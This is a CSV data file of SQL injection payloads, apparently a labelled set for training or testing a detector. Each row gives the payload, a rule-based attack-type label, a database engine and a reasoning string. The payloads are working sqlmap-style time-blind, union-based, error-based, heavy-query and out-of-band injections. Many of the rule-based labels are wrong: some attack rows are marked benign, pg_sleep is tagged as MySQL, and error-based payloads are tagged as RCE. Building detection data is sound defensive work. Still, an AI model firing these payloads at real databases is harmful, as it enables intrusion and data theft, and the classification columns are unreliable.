row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1380,"1"" ) ) and 2006 = 2006",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1381,"1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1382,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'wevl' = 'wevl,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1383,"-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --",1,,boolean_blind,generic,0.95,8056 = 8056 or detected — boolean_blind injection (priority 8) on generic,rule-based
1384,1' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1385,"1%' ) ) union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1386,"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1387,"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
1388,end and ( ( 'eqoc' like 'eqoc,1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
1389,1' ) as lewd where 3118 = 3118 order by 1--,1,,boolean_blind,generic,0.95,3118 = 3118 or detected — boolean_blind injection (priority 8) on generic,rule-based
1390,"-6076"" ) ) or 8277 = 4757",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1391,"1"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1392,"-6680"" ) ) ) union all select 2564,2564,2564,2564,2564,2564#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1393,1 ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1394,1' ) as upgb where 2031 = 2031,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1395,"1' where 6795 = 6795 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
1396,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'jjxn' = 'jjxn",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1397,select case when 2599 = 7035 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1398,"1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1399,"1"" ) as eibf where 5026 = 5026 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
1400,select ( case when ( 8403 = 7151 ) then 8403 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1401,"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,oracle,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on oracle",rule-based
1402,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) # fzni",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1403,1 ) where 9860 = 9860 and 4443 = 4111--,1,,boolean_blind,generic,0.95,9860 = 9860 and detected — boolean_blind injection (priority 8) on generic,rule-based
1404,"1"" ) where 3122 = 3122 and sleep ( 5 ) #",1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1405,"1"" ) ) as eglv where 7412 = 7412 union all select null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1406,1 and sleep ( 5 ) -- ruuv,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1407,1 ) rlike ( select ( case when ( 8488 = 1270 ) then 1 else 0x28 end ) ),1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
1408,"1%' union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1409,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'cimm' like 'cimm",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
